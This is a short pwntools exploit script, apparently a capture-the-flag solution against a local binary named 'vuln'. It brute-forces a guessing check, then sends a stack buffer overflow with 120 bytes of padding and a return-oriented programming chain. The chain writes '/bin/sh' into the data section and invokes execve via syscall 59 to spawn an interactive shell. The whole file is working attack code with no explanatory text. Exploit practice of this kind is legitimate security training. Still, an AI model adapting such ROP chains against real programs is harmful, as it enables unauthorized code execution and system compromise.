from pwn import *

context.log_level = 'INFO'
context.binary = binary = ELF('./vuln', checksec=False)

def brute_random():
	guessed = False
	while not guessed:
		p.sendline(b'64')
		guessed = b'Congrats' in p.recvrepeat(1)

p = process()

brute_random()

rop = ROP(binary)

mov_rsi_rax = p64(0x47ff91)
dot_data = p64(0x6ba0e0)
bin_sh = b'/bin/sh\x00'

pop_rdi = p64(rop.find_gadget(['pop rdi', 'ret'])[0])
pop_rsi = p64(rop.find_gadget(['pop rsi', 'ret'])[0])
pop_rdx = p64(rop.find_gadget(['pop rdx', 'ret'])[0])
pop_rax = p64(rop.find_gadget(['pop rax', 'ret'])[0])
syscall = p64(rop.find_gadget(['syscall', 'ret'])[0])

rop_chain = b'A' * 120
rop_chain += pop_rsi
rop_chain += dot_data
rop_chain += pop_rax
rop_chain += bin_sh
rop_chain += mov_rsi_rax
rop_chain += pop_rdi
rop_chain += dot_data
rop_chain += pop_rsi
rop_chain += p64(0)
rop_chain += pop_rdx
rop_chain += p64(0)
rop_chain += pop_rax
rop_chain += p64(59)
rop_chain += syscall

p.sendline(rop_chain)
p.recvrepeat(1)

p.interactive()
